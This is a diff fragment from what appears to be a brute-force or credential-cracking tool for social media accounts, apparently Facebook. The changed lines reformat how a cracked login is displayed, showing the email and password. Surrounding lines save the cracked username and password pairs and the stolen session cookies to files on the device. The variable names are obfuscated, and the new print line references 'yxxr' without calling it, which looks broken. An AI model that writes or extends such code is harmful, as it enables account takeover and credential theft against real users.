@@ -592,7 +592,11 @@ def gxds_files(uid, pxss):
                     ]
                 )
                 xcki = coki.split("sb=")[1]
-                print("\r\r\033[1;32m  [GXDS-HITS] " + uid + ":" + ps + " -\033[0;33m " + yxxr(uid))
+                print(f"""\r\r{lgr}  [GXDS-HITS]
+                {yellow}EMAIL: {uid}
+                {yellow}PASS : {ps}
+                {yellow}JOINED: {yxxr}
+                """)
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(xcki + "\n")
                 oks.append(uid)
